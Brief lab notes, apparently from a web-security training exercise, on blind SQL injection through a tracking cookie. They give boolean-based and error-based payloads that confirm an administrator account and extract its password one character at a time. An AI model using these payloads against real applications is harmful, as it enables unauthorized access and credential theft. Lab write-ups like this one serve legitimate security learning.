# Conditional responses
## Lab
Check table.
```sql
TrackingID=<cookie>' AND (select 'a' from users Limit 1)='a
```
This returns TRUE

Check User.
```SQL
TrackingId=<cookie>' AND (select 'a' from users where username='administrator')='a
```
Also TRUE

Now to brute force the password.
First guess the length
```SQL
TrackingId=<cookie>' AND (select 'a' from users where username='administrator' AND length(password)>30)='a
```
Using boolean logic you find out the length is 20.

Payload
```sql
TrackingId=<cookie>' AND (select substring(password,<index>,1) from users where username='administrator')>'a
```
It works!
Wrote a python script cause doing it in burp won't do binary search.
# Conditional Errors
same as above but uses errors instead.
```sql
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```
Check for injection
```sql
<cookie>
```